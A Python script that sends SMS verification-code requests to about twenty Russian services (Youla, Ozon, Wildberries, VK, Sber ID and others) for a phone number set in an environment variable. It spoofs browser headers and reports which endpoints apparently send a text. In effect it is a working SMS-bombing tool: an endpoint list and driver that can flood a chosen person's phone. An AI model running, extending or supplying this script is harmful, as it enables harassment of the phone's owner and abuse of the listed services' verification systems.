#!/usr/bin/env python3
import json
import os
import re
import subprocess
import sys
import time

PHONE = os.environ.get("PROBE_PHONE", "89312894756")
E164 = "+7" + PHONE.lstrip("8").lstrip("+7") if PHONE.startswith("8") else PHONE
UA = (
    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36"
)
JAR = "/tmp/otp_probe.txt"


def curl(args, jar=JAR):
    base = [
        "curl", "-4", "-s", "-c", jar, "-b", jar, "-A", UA,
        "--connect-timeout", "10", "--max-time", "20",
    ]
    proc = subprocess.run(base + args, capture_output=True, text=True)
    return proc.stdout, proc.stderr


def probe(name, method, url, headers=None, data=None, warmup=None):
    subprocess.run(["rm", "-f", JAR], check=False)
    if warmup:
        curl(["-o", "/dev/null", "-w", "%{http_code}", warmup])

    hdr = []
    if headers:
        for key, value in headers.items():
            hdr += ["-H", f"{key}: {value}"]

    args = ["-o", "/tmp/rbody", "-w", "%{http_code}|%{time_connect}"]
    if method == "POST":
        args += ["-X", "POST"]
        if data is not None:
            if isinstance(data, dict):
                hdr += ["-H", "Content-Type: application/json"]
                args += ["-d", json.dumps(data, ensure_ascii=False)]
            else:
                hdr += ["-H", "Content-Type: application/x-www-form-urlencoded"]
                args += ["-d", data]
    args += hdr + [url]

    out, _ = curl(args)
    try:
        code, conn = out.split("|")
    except ValueError:
        code, conn = "000", "?"

    body = open("/tmp/rbody").read() if os.path.exists("/tmp/rbody") else ""
    snippet = re.sub(r"\s+", " ", body[:180])
    ok_signs = [
        "deny_resend", "code_length", "otp", "sent", "success",
        "sms", "cooldown", "retry_after", "is_sent",
    ]
    looks_ok = code.startswith("2") and any(s in body.lower() for s in ok_signs)
    err = None
    try:
        parsed = json.loads(body)
        err = parsed.get("error") or parsed.get("message")
        if err is None and isinstance(parsed.get("errors"), list) and parsed["errors"]:
            err = parsed["errors"][0]
    except json.JSONDecodeError:
        pass

    status = "LIKELY_SMS" if looks_ok else ("HTTP_OK" if code.startswith("2") else "FAIL")
    print(f"{status}\t{name}\tHTTP {code}\tconn={conn}s\t{err or snippet}")


tests = [
    ("Youla OTP", "POST", "https://youla.ru/web-api/auth/request_code",
     {"Origin": "https://youla.ru", "Referer": "https://youla.ru/"},
     {"phone": PHONE}, "https://youla.ru/"),
    ("Ozon fastEntry", "POST", "https://www.ozon.ru/api/composer-api.bx/_action/fastEntry",
     {"Origin": "https://www.ozon.ru", "Referer": "https://www.ozon.ru/", "X-Requested-With": "XMLHttpRequest"},
     {"phone": E164, "otpId": 0}, "https://www.ozon.ru/"),
    ("Drom sign", "POST", "https://www.drom.ru/sign/request/",
     {"Origin": "https://www.drom.ru", "Referer": "https://www.drom.ru/"},
     f"phone={PHONE}", "https://www.drom.ru/"),
    ("Lamoda auth", "POST", "https://www.lamoda.ru/api/v1/customer/auth_phone",
     {"Origin": "https://www.lamoda.ru", "Referer": "https://www.lamoda.ru/"},
     {"phone": E164}, "https://www.lamoda.ru/"),
    ("FixPrice SMS", "POST", "https://fix-price.ru/ajax/register_phone_code.php",
     {"Origin": "https://fix-price.ru", "Referer": "https://fix-price.ru/", "X-Requested-With": "XMLHttpRequest"},
     f"register_call=Y&action=getCode&phone=%2B7{PHONE[1:]}", "https://fix-price.ru/"),
    ("IVI register", "POST", "https://api.ivi.ru/mobileapi/user/register/phone/v6/",
     {}, f"phone={PHONE}", None),
    ("SmartSpace", "POST", "https://smart.space/api/users/request_confirmation_code/",
     {}, {"mobile": E164, "action": "confirm_mobile"}, None),
    ("Dostavista SMS", "POST", "https://dostavista.ru/backend/send-verification-sms",
     {"Origin": "https://dostavista.ru", "Referer": "https://dostavista.ru/"},
     f"phone={PHONE}", "https://dostavista.ru/"),
    ("VK validatePhone", "POST", "https://api.vk.com/method/auth.validatePhone",
     {}, f"phone=%2B7{PHONE[1:]}&v=5.131&client_id=6287487", None),
    ("WB code request", "POST", "https://auth.wildberries.ru/api/v2/code/request",
     {"Origin": "https://www.wildberries.ru", "Referer": "https://www.wildberries.ru/"},
     {"phone_number": E164, "captcha": ""}, "https://www.wildberries.ru/"),
    ("DNS send-code", "POST", "https://www.dns-shop.ru/auth/send-code/",
     {"Origin": "https://www.dns-shop.ru", "Referer": "https://www.dns-shop.ru/"},
     {"phone": E164}, "https://www.dns-shop.ru/"),
    ("Citilink phone", "POST", "https://www.citilink.ru/registration/validate/phone/",
     {"Origin": "https://www.citilink.ru", "Referer": "https://www.citilink.ru/"},
     {"phone": PHONE}, "https://www.citilink.ru/"),
    ("Whoosh OTP", "POST", "https://whoosh.bike/api/v1/auth/otp",
     {"Origin": "https://whoosh.bike", "Referer": "https://whoosh.bike/"},
     {"phone": E164}, "https://whoosh.bike/"),
    ("Urent send-code", "POST", "https://urent.ru/api/v1/auth/send-code",
     {"Origin": "https://urent.ru", "Referer": "https://urent.ru/"},
     {"phone": E164}, "https://urent.ru/"),
    ("Samokat OTP", "POST", "https://samokat.ru/api/auth/otp",
     {"Origin": "https://samokat.ru", "Referer": "https://samokat.ru/"},
     {"phone": E164}, "https://samokat.ru/"),
    ("2GIS phone", "POST", "https://2gis.ru/api/1.0/users/auth/phone/request",
     {"Origin": "https://2gis.ru", "Referer": "https://2gis.ru/"},
     {"phone": E164}, "https://2gis.ru/"),
    ("MyGames SMS", "POST", "https://account.my.games/signup_send_sms/",
     {"Origin": "https://account.my.games", "Referer": "https://account.my.games/"},
     f"phone={PHONE}", "https://account.my.games/"),
    ("Edostav SMS", "POST", "https://edostav.ru/user/register",
     {"Origin": "https://edostav.ru", "Referer": "https://edostav.ru/"},
     {"phone": PHONE}, "https://edostav.ru/"),
    ("PMSM IQOS", "POST", "https://ube.pmsm.org.ru/esb/iqos-phone/validate",
     {}, {"phone": PHONE}, None),
    ("Sber ID hint", "POST", "https://id.sber.ru/CSAFront/api/auth/phone",
     {"Origin": "https://id.sber.ru", "Referer": "https://id.sber.ru/"},
     {"phone": E164}, "https://id.sber.ru/"),
]

if __name__ == "__main__":
    print("STATUS\tSERVICE\tDETAILS")
    for test in tests:
        probe(*test)
        time.sleep(0.4)
